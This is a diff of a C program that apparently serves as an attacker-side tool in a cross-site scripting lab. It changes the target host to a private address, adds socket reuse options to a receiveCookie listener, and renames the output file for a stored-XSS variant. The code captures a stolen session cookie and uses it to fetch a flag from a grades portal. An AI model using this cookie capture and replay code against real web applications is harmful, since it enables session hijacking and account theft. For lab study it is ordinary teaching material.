@@ -1,8 +1,3 @@
-//
-// Created by xssenv on 12/13/25.
-//
-// should run from attacker server
-// need to add socket instructions for automated tests
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -14,7 +9,7 @@
 #define PORT 8080
 #define BUF_SZ 16384
 
-#define HOST "http://localhost:8080/"
+#define HOST "http://192.168.1.203:80/"
 #define PATH "/GradersPortalTask2.php"
 #define SERVER_IP "192.168.1.201"
 #define WEBSERVER_IP "192.168.1.203"
@@ -55,7 +50,18 @@ int receiveCookie(char *cookie, size_t cookie_sz) {
     if (s < 0) return 0;
 
     int opt = 1;
-    (void)setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, (socklen_t)sizeof(opt));
+    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+        printf("setsockopt(SO_REUSEADDR) failed...\n");
+        close(s);
+        exit(1);
+    }
+
+    opt = 1;
+    if (setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
+        printf("setsockopt(SO_REUSEPORT) failed...\n");
+        close(s);
+        exit(1);
+    }
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
@@ -169,7 +175,7 @@ int getFlagFromGrades(char *cookie) {
 
     fclose(fp);
     close(sockfd);
-    printf("Saved raw HTTP response to spoofed-reflected.txt\n");
+    printf("Saved raw HTTP response to spoofed-stored.txt\n");
     return 0;
 }
 
